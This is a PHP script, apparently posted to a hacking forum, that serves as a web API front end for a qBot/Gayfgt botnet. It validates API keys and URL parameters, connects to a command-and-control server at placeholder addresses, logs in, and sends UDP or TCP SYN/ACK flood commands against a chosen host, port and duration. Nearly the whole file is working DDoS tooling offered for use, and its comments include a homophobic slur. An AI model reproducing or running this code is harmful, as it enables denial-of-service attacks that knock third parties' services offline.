<?php
 
    /*
    * qBot/Gayfgt Botnet API by BadLuckJosh
    * Twitter: @BadLuckJoshh - @0x424C4A
    * HF UID: 2769414
    * Usage: http://site.com/api.php?key=[key]&host=[host]&port=[port]&method=[method]&time=[time]
    * Reason for this?: http://hackforums.net/showthread.php?tid=5308445 - it's not worth any money, at all...
    *
    * KEEP THE "\n" ON THE END OF USERNAME/PASSWORD AND COMMANDS!
    */
 
    // API Keys
    $APIKeys = array("Key1", "Key2", "Key3");
 
    // VALID attack methods
    $attackMethods = array("UDP", "TCP", "STOP");
 
    // I'm so gay
    function htmlsc($string)
    {
        return htmlspecialchars($string, ENT_QUOTES, "UTF-8");
    }
 
    // Check if all parameters are passed
    if (!isset($_GET["key"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["method"]) || !isset($_GET["time"]))
        die("You are missing a parameter");
 
    // Variables for attack
    $key = htmlsc($_GET["key"]);
    $host = htmlsc($_GET["host"]);
    $port = htmlsc($_GET["port"]);
    $method = htmlsc(strtoupper($_GET["method"]));
    $time = htmlsc($_GET["time"]);
    $command = "";
 
    // Check if API key is valid
    if (!in_array($key, $APIKeys)) die("Invalid API key");
 
    // Check if attack method is valid
    if (!in_array($method, $attackMethods)) die("Invalid attack method");
 
    // Set command for method (should really use a switch() statement but who cares?)
    if ($method == "UDP") $command = "!* UDP $host $port $time 32 1024 10\n";
    else if ($method == "TCP") $command = "!* TCP $host $port $time 32 syn,ack 0 10\n";
    else if ($method == "STOP") $command = "!* KILLATTK\n";
    // Add other methods if you need them, I'm sure you're capable of doing that (I hope)
 
    // Connect
    $socket = fsockopen("BOTNETIP", CNCPORT); // Example: $socket = fsockopen("1.2.3.4", 1337);
    ($socket ? null : die("Failed to connect"));
 
    // Login
    fwrite($socket, "USERNAME\n"); // If you don't require a username, just remove this line...
    fwrite($socket, "PASSWORD\n");
 
    // Send command
    sleep(1); // Why? I've noticed for some people it doesn't work w/o the sleep() (or anything before fwrite()ing $command)!
    fwrite($socket, $command);
 
    // Close connection
    fclose($socket);
 
    // Say the attack has been sent
    echo "Attack sent to $host:$port for $time seconds using method $method!\n";
 
?>